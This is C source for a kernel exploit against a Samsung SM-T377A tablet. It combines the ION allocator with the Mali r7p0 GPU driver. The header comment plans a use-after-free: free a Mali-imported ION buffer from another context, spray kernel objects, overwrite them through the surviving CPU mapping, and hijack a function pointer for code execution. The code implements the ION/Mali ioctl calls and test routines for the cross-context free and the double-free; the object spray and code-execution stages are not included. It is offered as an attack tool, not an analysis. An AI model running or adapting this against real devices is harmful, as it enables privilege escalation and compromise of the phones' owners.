/*
 * mali_ion_exploit.c — Combined ION + Mali exploit
 *
 * ION gives us CPU-mmappable buffers.
 * Mali gives us cross-context free and double-free UAF.
 *
 * Strategy:
 * 1. ION: allocate buffer → share → get dma-buf fd → mmap (CPU access)
 * 2. Mali: import the ION dma-buf fd (MEM_IMPORT, type=1)
 *    → The ION buffer's physical pages are now in Mali's GPU VA space
 * 3. Mali: trigger cross-context free on the imported region
 *    → Physical pages freed from GPU context but CPU mmap still valid!
 * 4. If pages return to kernel allocator: spray controlled objects
 * 5. Write via ION mmap → overwrite kernel object
 * 6. Trigger function pointer call → code execution
 *
 * Alternative: use double-free to get overlapping regions with
 * different permissions, allowing write to "read-only" kernel memory.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

/* ========== ION definitions ========== */
typedef int ion_user_handle_t;

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    ion_user_handle_t handle;
};

struct ion_fd_data {
    ion_user_handle_t handle;
    int fd;
};

struct ion_handle_data {
    ion_user_handle_t handle;
};

#define ION_IOC_MAGIC   'I'
#define ION_IOC_ALLOC   _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE    _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE   _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)
#define ION_IOC_IMPORT  _IOWR(ION_IOC_MAGIC, 5, struct ion_fd_data)

#define ION_HEAP_SYSTEM_MASK (1 << 0)

/* ========== Mali definitions ========== */
struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}

#define KBASE_FUNC_MEM_ALLOC      512
#define KBASE_FUNC_MEM_IMPORT     513
#define KBASE_FUNC_MEM_FREE       516
#define KBASE_FUNC_MEM_FLAGS_CHANGE 517

#define BASE_MEM_IMPORT_SHARED    (1U << 30)

/* ========== Helpers ========== */

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16); ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16); ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static uint64_t mali_alloc(int fd, uint32_t pages, uint32_t flags) {
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 512;
    *(uint64_t*)(buf + 8) = pages;
    *(uint64_t*)(buf + 16) = pages;
    *(uint32_t*)(buf + 32) = flags;
    if (ioctl(fd, make_cmd(56), buf) < 0) return 0;
    return *(uint64_t*)(buf + 40);
}

static int mali_free(int fd, uint64_t va) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = va;
    return ioctl(fd, make_cmd(16), buf);
}

/*
 * Mali MEM_IMPORT — import an external memory handle (ION fd)
 *
 * Struct layout (estimated, may need adjustment):
 * offset 0:  uk_header (8 bytes)
 * offset 8:  phandle (u64) — the dma-buf fd (or ION handle)
 * offset 16: type (u32) — 0=UMP, 1=ION, 2=user_buf
 * offset 20: padding (u32)
 * offset 24: gpu_va (u64) — OUT
 * offset 32: va_pages (u64) — OUT
 * offset 40: flags (u32) — IN
 * offset 44: padding (u32)
 * Total: 48 bytes
 */
static uint64_t mali_import_ion(int mali_fd, int dma_buf_fd, uint32_t flags) {
    /*
     * Mali r7p0 MEM_IMPORT struct (UK v10.0):
     *   offset  0: uk_header (8)
     *   offset  8: phandle (u64) — pointer to handle data struct
     *   offset 16: type (u32) — 0=UMP, 1=dma-buf
     *   offset 20: padding (u32)
     *   offset 24: gpu_va (u64) — OUT
     *   offset 32: va_pages (u64) — OUT
     *   offset 40: flags (u32) — IN
     *   offset 44: padding (u32)
     * Total: 48 bytes
     *
     * For type=1 (dma-buf), phandle points to: struct { int fd; }
     */

    /* The handle data is just the fd */
    int handle_data = dma_buf_fd;

    uint8_t buf[48];
    memset(buf, 0, sizeof(buf));
    ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_IMPORT;
    *(uint64_t*)(buf + 8) = (uintptr_t)&handle_data;  /* phandle = pointer */
    *(uint32_t*)(buf + 16) = 2;     /* type = UMM (dma-buf), NOT UMP(1)! */
    *(uint32_t*)(buf + 20) = 0;     /* padding */
    *(uint32_t*)(buf + 40) = flags; /* flags */

    int r = ioctl(mali_fd, make_cmd(48), buf);
    if (r < 0) {
        fprintf(stderr, "[-] MEM_IMPORT: errno=%d (%s)\n", errno, strerror(errno));

        /* Try with flags at different offset */
        memset(buf, 0, sizeof(buf));
        ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_IMPORT;
        *(uint64_t*)(buf + 8) = (uintptr_t)&handle_data;
        *(uint32_t*)(buf + 16) = 2;     /* UMM */
        *(uint32_t*)(buf + 20) = flags;

        r = ioctl(mali_fd, make_cmd(48), buf);
        if (r < 0) {
            fprintf(stderr, "[-] MEM_IMPORT(v2): errno=%d (%s)\n", errno, strerror(errno));
            return 0;
        }
    }

    /* Extract gpu_va — check id field for result (0=success, 3=invalid param) */
    uint32_t result = ((struct uk_header*)buf)->id;
    uint64_t gpu_va = *(uint64_t*)(buf + 24);
    uint64_t va_pages = *(uint64_t*)(buf + 32);

    fprintf(stderr, "[*] MEM_IMPORT: result=%u gpu_va=0x%llx va_pages=%llu\n",
            result, (unsigned long long)gpu_va, (unsigned long long)va_pages);

    /* Scan for any non-zero page-aligned values */
    if (!gpu_va) {
        fprintf(stderr, "[*] Full response:\n");
        for (int i = 0; i < 48; i += 4)
            fprintf(stderr, "  [%2d] 0x%08x\n", i, *(uint32_t*)(buf + i));
    }

    return gpu_va;
}

/* ============================================================ */
/* TEST 1: ION buffer import into Mali                          */
/* ============================================================ */
static void test_ion_import(void) {
    fprintf(stderr, "\n=== TEST 1: ION buffer import into Mali ===\n");

    /* Open ION */
    int ion_fd = open("/dev/ion", O_RDWR | O_CLOEXEC);
    if (ion_fd < 0) {
        fprintf(stderr, "[-] open(/dev/ion): %s\n", strerror(errno));
        return;
    }

    /* Allocate ION buffer (1 page) */
    struct ion_allocation_data alloc_data = {
        .len = 4096,
        .align = 4096,
        .heap_id_mask = ION_HEAP_SYSTEM_MASK,
        .flags = 0,
    };
    if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc_data) < 0) {
        fprintf(stderr, "[-] ION_IOC_ALLOC: %s\n", strerror(errno));
        close(ion_fd);
        return;
    }
    fprintf(stderr, "[+] ION alloc: handle=%d\n", alloc_data.handle);

    /* Share → get dma-buf fd */
    struct ion_fd_data share_data = { .handle = alloc_data.handle };
    if (ioctl(ion_fd, ION_IOC_SHARE, &share_data) < 0) {
        fprintf(stderr, "[-] ION_IOC_SHARE: %s\n", strerror(errno));
        close(ion_fd);
        return;
    }
    int dma_fd = share_data.fd;
    fprintf(stderr, "[+] ION share: dma_buf_fd=%d\n", dma_fd);

    /* mmap the ION buffer (CPU access) */
    void *cpu_addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                          dma_fd, 0);
    if (cpu_addr == MAP_FAILED) {
        fprintf(stderr, "[-] ION mmap: %s\n", strerror(errno));
        close(dma_fd);
        close(ion_fd);
        return;
    }
    fprintf(stderr, "[+] ION mmap: CPU addr=%p\n", cpu_addr);

    /* Write test pattern via CPU */
    *(volatile uint32_t*)cpu_addr = 0xAAAA5555;
    fprintf(stderr, "[+] ION write/read: 0x%08x\n", *(volatile uint32_t*)cpu_addr);

    /* Open Mali context */
    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) {
        fprintf(stderr, "[-] Mali open failed\n");
        munmap(cpu_addr, 4096);
        close(dma_fd);
        close(ion_fd);
        return;
    }
    fprintf(stderr, "[+] Mali context: fd=%d\n", mali_fd);

    /* Import ION buffer into Mali */
    uint64_t gpu_va = mali_import_ion(mali_fd, dma_fd, 0x0F | BASE_MEM_IMPORT_SHARED);
    if (gpu_va) {
        fprintf(stderr, "[+] ION buffer imported at GPU VA=0x%llx\n",
                (unsigned long long)gpu_va);

        /* The same physical pages are now accessible from:
         * - CPU: via cpu_addr (ION mmap)
         * - GPU: via gpu_va (Mali import)
         *
         * Now test: can we free the Mali region while keeping ION mmap?
         */
        fprintf(stderr, "[*] Freeing Mali imported region...\n");
        int r = mali_free(mali_fd, gpu_va);
        fprintf(stderr, "[*] Mali free: ret=%d\n", r);

        /* Check if ION mmap still works */
        volatile uint32_t v = *(volatile uint32_t*)cpu_addr;
        fprintf(stderr, "[*] ION mmap after Mali free: 0x%08x\n", v);

        /* Write new pattern */
        *(volatile uint32_t*)cpu_addr = 0xBBBB6666;
        v = *(volatile uint32_t*)cpu_addr;
        fprintf(stderr, "[*] ION mmap write after Mali free: 0x%08x\n", v);

        /* Cross-context test: open second Mali, free from there */
        int mali_fd2 = mali_open_ctx();
        if (mali_fd2 >= 0) {
            /* Re-import on ctx1 */
            uint64_t gpu_va2 = mali_import_ion(mali_fd, dma_fd, 0x0F | BASE_MEM_IMPORT_SHARED);
            if (gpu_va2) {
                fprintf(stderr, "[+] Re-imported on ctx1: GPU VA=0x%llx\n",
                        (unsigned long long)gpu_va2);

                /* Cross-context free from ctx2 */
                int xr = mali_free(mali_fd2, gpu_va2);
                fprintf(stderr, "[*] Cross-context free: ret=%d\n", xr);

                /* Check ION mmap */
                v = *(volatile uint32_t*)cpu_addr;
                fprintf(stderr, "[*] After cross-ctx free: ION reads 0x%08x\n", v);

                /* The physical pages might now be freed from Mali
                 * but ION still holds a reference through dma_buf.
                 * The pages stay alive until all references are dropped.
                 */
            }
            close(mali_fd2);
        }
    } else {
        fprintf(stderr, "[-] MEM_IMPORT failed — trying alternative\n");

        /* Try importing with different parameters */
        fprintf(stderr, "[*] Trying MEM_IMPORT with ION handle instead of fd...\n");
        uint64_t gpu_va2 = mali_import_ion(mali_fd, alloc_data.handle, 0x0F | BASE_MEM_IMPORT_SHARED);
        if (gpu_va2) {
            fprintf(stderr, "[+] Import with ION handle: GPU VA=0x%llx\n",
                    (unsigned long long)gpu_va2);
        }
    }

    /* Cleanup */
    munmap(cpu_addr, 4096);
    close(mali_fd);
    close(dma_fd);

    struct ion_handle_data free_data = { .handle = alloc_data.handle };
    ioctl(ion_fd, ION_IOC_FREE, &free_data);
    close(ion_fd);
}

/* ============================================================ */
/* TEST 2: Mali double-free with ION import                      */
/* ============================================================ */
static void test_dfree_ion(void) {
    fprintf(stderr, "\n=== TEST 2: Double-free on ION-imported region ===\n");

    int ion_fd = open("/dev/ion", O_RDWR | O_CLOEXEC);
    if (ion_fd < 0) return;

    struct ion_allocation_data alloc = {
        .len = 4096, .align = 4096,
        .heap_id_mask = ION_HEAP_SYSTEM_MASK,
    };
    if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) { close(ion_fd); return; }

    struct ion_fd_data share = { .handle = alloc.handle };
    if (ioctl(ion_fd, ION_IOC_SHARE, &share) < 0) { close(ion_fd); return; }

    void *cpu = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                     share.fd, 0);
    if (cpu == MAP_FAILED) { close(share.fd); close(ion_fd); return; }

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) { munmap(cpu, 4096); close(share.fd); close(ion_fd); return; }

    uint64_t gpu_va = mali_import_ion(mali_fd, share.fd, 0x0F | BASE_MEM_IMPORT_SHARED);
    if (!gpu_va) {
        fprintf(stderr, "[-] Import failed\n");
        close(mali_fd); munmap(cpu, 4096); close(share.fd); close(ion_fd);
        return;
    }

    fprintf(stderr, "[+] ION buffer @ CPU=%p, GPU=0x%llx\n",
            cpu, (unsigned long long)gpu_va);

    /* Write pattern */
    *(volatile uint32_t*)cpu = 0x11111111;

    /* Double free the imported region */
    int r1 = mali_free(mali_fd, gpu_va);
    int r2 = mali_free(mali_fd, gpu_va);
    fprintf(stderr, "[*] Double free: r1=%d r2=%d\n", r1, r2);

    /* Check if CPU mapping still works */
    fprintf(stderr, "[*] CPU read after double free: 0x%08x\n",
            *(volatile uint32_t*)cpu);

    /* Allocate new Mali region — might reuse the freed pages' metadata */
    uint64_t new_va = mali_alloc(mali_fd, 1, 0x0F);
    fprintf(stderr, "[*] New alloc: 0x%llx\n", (unsigned long long)new_va);

    /* Write via CPU and check if it affected the new allocation */
    *(volatile uint32_t*)cpu = 0x22222222;
    fprintf(stderr, "[*] CPU write: 0x%08x\n", *(volatile uint32_t*)cpu);

    /* Cleanup */
    munmap(cpu, 4096);
    close(mali_fd);
    close(share.fd);
    struct ion_handle_data fh = { .handle = alloc.handle };
    ioctl(ion_fd, ION_IOC_FREE, &fh);
    close(ion_fd);
}

int main(void) {
    fprintf(stderr, "=== Mali + ION Combined Exploit ===\n");
    fprintf(stderr, "Target: SM-T377A, Mali r7p0, ION\n\n");

    test_ion_import();
    test_dfree_ion();

    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
